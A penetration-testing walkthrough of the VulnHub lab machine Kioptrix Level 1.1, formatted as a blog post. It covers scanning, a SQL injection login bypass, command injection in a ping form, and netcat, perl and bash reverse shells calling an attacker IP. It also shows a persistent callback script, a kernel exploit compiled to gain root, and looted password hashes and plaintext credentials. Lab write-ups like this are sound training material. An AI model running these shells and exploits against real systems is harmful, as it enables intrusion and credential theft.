@@ -1,0 +1,633 @@
+---
+layout: post
+title:  "Kioptrix: Level 1.1 (#2)"
+date:   2019-05-13 14:00:08 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [kioptrix, sqli, kernel exploit]
+---
+    <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></div>
+    <div>Hostname:</div>
+    <div>IP Address: 10.183.0.238</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Information Gathering/Recon</h2></div>
+    <div><br /></div>
+    <div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.238.</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Service Enumeration/Scanning</h2></div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2# nmap -Pn -sT -sV --script=default,banner -A -oA kioptrix2 -p- 10.183.0.238</div>
+        <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 22:14 CDT</div>
+        <div>Nmap scan report for 10.183.0.238   </div>
+        <div>Host is up (0.0031s latency).</div>
+        <div>Not shown: 65528 closed ports</div>
+        <div>PORT     STATE SERVICE    VERSION   </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)</font>
+        </div>
+        <div>|_banner: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">SSH-1.99-OpenSSH_3.9p1</font>
+        </div>
+        <div>| ssh-hostkey:</div>
+        <div>|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</div>
+        <div>|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</div>
+        <div>|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</div>
+        <div>|_sshv1: Server supports SSHv1</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))</font>
+        </div>
+        <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.0.52</font> (CentOS)</div>
+        <div>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp  open  rpcbind    2 (RPC #100000)</font>
+        </div>
+        <div>| rpcinfo:</div>
+        <div>|   program version   port/proto  service</div>
+        <div>|   100000  2            111/tcp  rpcbind</div>
+        <div>|   100000  2            111/udp  rpcbind</div>
+        <div>|   100024  1            821/udp  status</div>
+        <div>|_  100024  1            824/tcp  status</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">443/tcp  open  ssl/https?</font>
+        </div>
+        <div>|_ssl-date: 2019-05-12T00:05:23+00:00; -3h09m46s from scanner time.</div>
+        <div>| sslv2: </div>
+        <div>|   SSLv2 supported</div>
+        <div>|   ciphers:</div>
+        <div>|     SSL2_RC4_128_WITH_MD5</div>
+        <div>|     SSL2_RC4_64_WITH_MD5</div>
+        <div>|     SSL2_RC2_128_CBC_WITH_MD5</div>
+        <div>|     SSL2_DES_192_EDE3_CBC_WITH_MD5</div>
+        <div>|     SSL2_DES_64_CBC_WITH_MD5</div>
+        <div>|     SSL2_RC4_128_EXPORT40_WITH_MD5</div>
+        <div>|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">631/tcp  open  ipp        CUPS 1.1  </font>
+        </div>
+        <div>| http-methods:</div>
+        <div>|_  Potentially risky methods: PUT  </div>
+        <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">CUPS/1.1</font>
+        </div>
+        <div>|_http-title: 403 Forbidden</div>
+        <div>
+            <font style="color: rgb(0, 138, 140); --inversion-type-color:  simple;">824/tcp  open  status     1 (RPC #100024)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 138, 140); --inversion-type-color:  simple;">3306/tcp open  mysql      MySQL (unauthorized)</font>
+        </div>
+        <div>| banner: I\x00\x00\x00\xFFj\x04Host 'kali.homenet.dom' is not allowed to</div>
+        <div>|_ connect to this MySQL server</div>
+        <div>MAC Address: 00:0C:29:53:19:4C (VMware)</div>
+        <div>Device type: general purpose</div>
+        <div>Running: Linux 2.6.X</div>
+        <div>OS CPE: cpe:/o:linux:linux_kernel:2.6</div>
+        <div>OS details: Linux 2.6.9 - 2.6.18</div>
+        <div>Network Distance: 1 hop</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>Host script results:</div>
+        <div>|_clock-skew: mean: -3h09m46s, deviation: 0s, median: -3h09m46s</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>TRACEROUTE</div>
+        <div>HOP RTT     ADDRESS</div>
+        <div>1   3.05 ms 10.183.0.238</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 114.97 seconds</div>
+    </div>
+    <div><br /></div>
+    <!--more-->
+    <div><br /></div>
+    <div><h2>Gaining Access</h2></div>
+    <div><br /></div>
+    <div>The following software was identified by the nmap scan:</div>
+    <ul>
+        <li>
+            <div>OpenSSH 3.9p1 - buffer overflow issues</div>
+        </li>
+        <li>
+            <div>Apache/2.0.52 - known user disclosure and DoS issues</div>
+        </li>
+        <li>
+            <div>CUPS/1.1 - buffer overflow and DoS issues</div>
+        </li>
+    </ul>
+    <div><br /></div>
+    <div>OpenSSH issues...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                         | exploits/unix/remote/21578.txt</div>
+        <div>OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                         | exploits/unix/remote/21579.txt</div>
+    </div>
+    <div><br /></div>
+    <div>Reading through the write-ups for the OpenSSH issues, we see the vulnerabilities were fixed in version 3.4, so they won’t be of any use to us.</div>
+    <div><br /></div>
+    <div>CUPS issues...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>CUPS 1.1.x - '.HPGL' File Processor Buffer Overflow                                                          | exploits/linux/remote/24977.txt</div>
+    </div>
+    <div><br /></div>
+    <div>Reading through the write-up for the CUPS issue, we’d need to be able to print a file. The service shows to support the PUT method, but also returns a 403 Forbidden error, so we probably can’t upload anything (I confirmed this).</div>
+    <div><br /></div>
+    <div>Moving on to the HTTP service on TCP port 80...</div>
+    <div><br /></div>
+    <div>The default site for the service contains a "Remote System Administration Login” login form. Checking for a possible SQL injection vulnerability, we are quickly able to “login” using the following string in the username field.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>%' or 1=1 #</div>
+    </div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-05-13-kioptrix-level-1.1/21A8FFDB-5DE5-4859-865A-9FE55E522B33.png" height="124" width="313" /><br /></div>
+    <div><br /></div>
+    <div>The next form we are presented with after logging in is a “ping” interface.</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-05-13-kioptrix-level-1.1/5A797928-0F04-43D3-B797-A1BED2D85B74.png" height="64" width="610" /><br /></div>
+    <div><br /></div>
+    <div>Trying the following input...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>127.0.0.1; id;</div>
+    </div>
+    <div><br /></div>
+    <div>We get this response (opened in a new window/tab).</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-05-13-kioptrix-level-1.1/49D2E6C1-9A47-40B9-A102-BA009E54B177.png" height="176" width="496" /><br /></div>
+    <div><br /></div>
+    <div>So, we know we have a command execution vulnerability. Time to get our reverse shell.</div>
+    <div><br /></div>
+    <div>First, I’ll start two listeners in Metasploit. I like to start two listeners because reverse shells started through web requests typically timeout quickly. Once connected, I like to start a second reverse shell that is more stable.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>msf5 &gt; use exploit/multi/handler</div>
+        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+        <div>payload =&gt; generic/shell_reverse_tcp</div>
+        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+        <div>LHOST =&gt; 10.183.0.222</div>
+        <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+        <div>LPORT =&gt; 5432</div>
+        <div>msf5 exploit(multi/handler) &gt; run -j</div>
+        <div>[*] Exploit running as background job 0.</div>
+        <div>[*] Exploit completed, but no session was created.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
+        <div>msf5 exploit(multi/handler) &gt; </div>
+        <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+        <div>payload =&gt; generic/shell_reverse_tcp</div>
+        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+        <div>LHOST =&gt; 10.183.0.222</div>
+        <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+        <div>LPORT =&gt; 5433</div>
+        <div>msf5 exploit(multi/handler) &gt; run -j</div>
+        <div>[*] Exploit running as background job 1.</div>
+        <div>[*] Exploit completed, but no session was created.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
+    </div>
+    <div><br /></div>
+    <div>I’ll use netcat to start my first reverse shell from the “ping” interface. I’ll use perl to start my second reverse shell from the first.</div>
+    <div><br /></div>
+    <div>Netcat shell command...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5432 &gt;/tmp/f</div>
+    </div>
+    <div><br /></div>
+    <div>Perl shell command...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
+    </div>
+    <div><br /></div>
+    <div>Unfortunately, my netcat command didn’t work. Netcat might not be installed. I’ll try again with a bash reverse shell...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash -i &gt;&amp; /dev/tcp/10.183.0.222/5432 0&gt;&amp;1</div>
+    </div>
+    <div><br /></div>
+    <div>Worked! I got my first session and set up my second session.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.238:40009) at 2019-05-11 23:11:56 -0500</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+        <div>[*] Starting interaction with 1...</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>bash-3.00$ pwd</div>
+        <div>/var/www/html</div>
+        <div>bash-3.00$ id</div>
+        <div>uid=48(apache) gid=48(apache) groups=48(apache)</div>
+        <div>bash-3.00$ perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
+        <div>[1] 3998</div>
+        <div>bash-3.00$ [*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.238:40010) at 2019-05-11 23:12:09 -0500</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>bash-3.00$ background</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>Background session 1? [y/N]  y</div>
+        <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
+        <div>[*] Starting interaction with 2...</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>bash-3.00$ id</div>
+        <div>uid=48(apache) gid=48(apache) groups=48(apache)</div>
+        <div>bash-3.00$ [*] 10.183.0.238 - Command shell session 2 closed.</div>
+    </div>
+    <div><br /></div>
+    <div>Unfortunately, both closed when the web request timed out. 😞</div>
+    <div><br /></div>
+    <div>I decided to create a simple shell script that will try to connect back to my attacking machine every 20 seconds and use python’s SimpleHTTPServer to serve it up to the victim.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2# cat thumbs</div>
+        <div>#!/bin/sh</div>
+        <div>while true; do</div>
+        <div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
+        <div>    # sleep for 20 seconds</div>
+        <div>    sleep 20</div>
+        <div>done</div>
+        <div>root@kali:~/Walkthroughs/kioptrix2# python -m SimpleHTTPServer 4321</div>
+        <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+        <div>10.183.0.238 - - [12/May/2019 09:37:19] "GET /thumbs HTTP/1.0" 200 -</div>
+    </div>
+    <div><br /></div>
+    <div>I uploaded the script to the victim's /tmp directory and ran it in the background (and disowned it). Now, if I get disconnected, I should be able to restart a listener and get back in within 20 seconds.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00$ cd /tmp</div>
+        <div>bash-3.00$ wget -O thumbs2 10.183.0.222:4321/thumbs</div>
+        <div>--07:27:34--  http://10.183.0.222:4321/thumbs</div>
+        <div>           =&gt; `thumbs'</div>
+        <div>Connecting to 10.183.0.222:4321... connected.</div>
+        <div>HTTP request sent, awaiting response... 200 OK</div>
+        <div>Length: 298 [application/octet-stream]</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>    0K                                                       100%   25.84 MB/s</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>07:27:34 (25.84 MB/s) - `thumbs' saved [298/298]</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>bash-3.00$ chmod +x thumbs</div>
+        <div>bash-3.00$ ./thumbs &amp;</div>
+        <div>[2] 14001</div>
+    </div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Maintaining Access</h2></div>
+    <div><br /></div>
+    <div>Our thumbs script should help us maintain access. Moving on...</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Privilege Escalation</h2></div>
+    <div><br /></div>
+    <div>Checking the installed os and kernel...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00$ uname -a</div>
+        <div>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</div>
+        <div>bash-3.00$ cat /etc/issue.net</div>
+        <div>CentOS release 4.5 (Final)</div>
+    </div>
+    <div><br /></div>
+    <div>We have lots of possible exploits for this particular kernel, but there’s one exploit that seems to match our running kernel and os pretty directly...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0  | exploits/linux_x86/local/9542.c</div>
+    </div>
+    <div><br /></div>
+    <div>...so we’ll try it out on our victim. We’ll make a local copy in our working directory and then transfer it to the victim using python’s SimpleHTTPServer.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2# cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c .</div>
+        <div>root@kali:~/Walkthroughs/kioptrix2# python -m SimpleHTTPServer 4321</div>
+        <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+        <div>10.183.0.238 - - [12/May/2019 00:50:09] "GET /9542.c HTTP/1.0" 200 -</div>
+    </div>
+    <div><br /></div>
+    <div>Then, on the victim...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00$ wget -O 9542.c 10.183.0.222:4321/9542.c </div>
+        <div>--22:40:22--  http://10.183.0.222:4321/9542.c</div>
+        <div>           =&gt; `9542.c'</div>
+        <div>Connecting to 10.183.0.222:4321... connected.</div>
+        <div>HTTP request sent, awaiting response... 200 OK</div>
+        <div>Length: 2,643 (2.6K) [text/plain]</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>    0K ..                                                    100%  315.07 MB/s</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>22:40:22 (315.07 MB/s) - `9542.c' saved [2643/2643]</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>bash-3.00$ gcc -o pwn 9542.c</div>
+        <div>9542.c:109:28: warning: no newline at end of file</div>
+        <div>bash-3.00$ ./pwn</div>
+        <div>sh: no job control in this shell</div>
+        <div>sh-3.00# id   </div>
+        <div>uid=0(root) gid=0(root) groups=48(apache)</div>
+    </div>
+    <div><br /></div>
+    <div>We have root! 😄</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Pivoting</h2></div>
+    <div>N/A</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Clean Up</h2></div>
+    <div><br /></div>
+    <div>*** REMOVE /tmp/9542.c ***</div>
+    <div>*** REMOVE /tmp/pwn ***</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Additional Info</h2></div>
+    <div><br /></div>
+    <div><span style="font-weight: bold;">netcat</span></div>
+    <div><br /></div>
+    <div>I was curious if netcat was available since our netcat command didn’t work when trying to start a reverse shell from the “ping” web app. When checking if ’nc’ was available, I noticed our PATH variable was pretty sparse. I decided to expand it to see if there were more programs available.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00$ which nc</div>
+        <div>which: no nc in (/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin)</div>
+        <div>bash-3.00$ export PATH=$PATH:/home/seekorswim:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div>
+    </div>
+    <div><br /></div>
+    <div>After expanding PATH to include more common locations, we have netcat!</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00$ which nc</div>
+        <div>/usr/local/bin/nc</div>
+    </div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><span style="font-weight: bold;">anaconda-ks.cfg</span></div>
+    <div><br /></div>
+    <div>Checking on files in the /root directory, I noticed a kickstart setup file (anaconda-ks.cfg). Setup files can often contain passwords for user accounts that are going to be created (including root). Checking the file...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>sh-3.00# cat anaconda-ks.cfg</div>
+        <div># Kickstart file automatically generated by anaconda.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>install  </div>
+        <div>cdrom</div>
+        <div>lang en_US.UTF-8</div>
+        <div>langsupport --default=en_US.UTF-8 en_US.UTF-8</div>
+        <div>keyboard us</div>
+        <div>xconfig --card "VMWare" --videoram 131072 --hsync 31.5-37.9 --vsync 50-70 --resolution 800x600 --depth 16</div>
+        <div>network --device eth0 --bootproto dhcp</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">rootpw --iscrypted $1$P6T9.F9L$xWdVUe236dzLXYsXK/IZ60</font>
+        </div>
+        <div>firewall --disabled</div>
+        <div>selinux --disabled</div>
+        <div>authconfig --enableshadow --enablemd5</div>
+        <div>timezone America/New_York</div>
+        <div>bootloader --location=mbr</div>
+        <div># The following is the partition information you requested</div>
+        <div># Note that any partitions you deleted are not expressed</div>
+        <div># here so unless you clear all partitions first, this is</div>
+        <div># not guaranteed to work</div>
+        <div>#clearpart --all --drives=hda</div>
+        <div>#part /boot --fstype ext3 --size=100 --ondisk=hda</div>
+        <div>#part pv.2 --size=0 --grow --ondisk=hda</div>
+        <div>#volgroup VolGroup00 --pesize=32768 pv.2</div>
+        <div>#logvol / --fstype ext3 --name=LogVol00 --vgname=VolGroup00 --size=1024 --grow</div>
+        <div>#logvol swap --fstype swap --name=LogVol01 --vgname=VolGroup00 --size=256 --grow --maxsize=512</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>%packages</div>
+        <div>@ mysql  </div>
+        <div>@ admin-tools</div>
+        <div>@ system-tools</div>
+        <div>@ dialup </div>
+        <div>@ ftp-server</div>
+        <div>@ web-server</div>
+        <div>@ server-cfg</div>
+        <div>@ development-tools</div>
+        <div>kernel-devel</div>
+        <div>e2fsprogs</div>
+        <div>kernel   </div>
+        <div>lvm2</div>
+        <div>grub</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>%post</div>
+    </div>
+    <div><br /></div>
+    <div>We were not able to crack the hash using a simple john --single pass.</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><span style="font-weight: bold;">.mysql_history</span></div>
+    <div><br /></div>
+    <div>Checking on files in the /root directory, we found a mysql history file with several usernames and passwords.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>show databases;</div>
+        <div>create database webapp;</div>
+        <div>use webapp;</div>
+        <div>create table users(id INT,username varchar(100),password varchar(10));</div>
+        <div>show database;</div>
+        <div>select * from users;</div>
+        <div>show databases;</div>
+        <div>use webapp;</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">insert into users values(1,'admin','hello');</font>
+        </div>
+        <div>select * from users;</div>
+        <div>use mysql</div>
+        <div>show databases;</div>
+        <div>use mysql;</div>
+        <div>select * from users where user=john;</div>
+        <div>show tables;</div>
+        <div>select * from user where user=john;</div>
+        <div>select * from user where user='john';</div>
+        <div>select * from user;</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">create user 'john'@'localhost' identified by 'hiroshima';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">create user 'webapp'@'localhost' identified by 'hiroshima';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">create user 'webapp'@'localhost' IDENTIFIED BY 'hiroshima';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">CREATE USER 'webapp'@'localhost' identified by 'hiroshima';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update user set password = password('hiroshima') where user = 'john';</font>
+        </div>
+        <div>use mysql;</div>
+        <div>show users;</div>
+        <div>select * from user;</div>
+        <div>
